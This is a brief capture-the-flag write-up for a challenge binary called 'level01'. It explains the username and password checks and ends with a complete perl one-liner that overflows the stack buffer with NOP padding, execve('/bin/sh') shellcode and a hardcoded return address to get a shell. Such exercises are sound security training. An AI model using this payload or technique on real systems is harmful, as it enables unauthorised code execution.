1. The program waits for a username, and if valid, prompts for a password from STDIN.
2. We discovered that the username "dat_wil" and password "admin" are significant.
3. Regardless of the password, the binary behaves the same, but it always checks against "admin" from STDIN.
4. The username is stored globally, while the password is stored on the stack.
5. To exploit this, we constructed a payload that sends "dat_wil" as the username followed by the exploit :

(perl -e 'print "dat_wil" . "\x0a" . "\x90"x10 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" . "1"x47 . "\x30\xde\xff\xff"'; cat -) | env -i ./level01

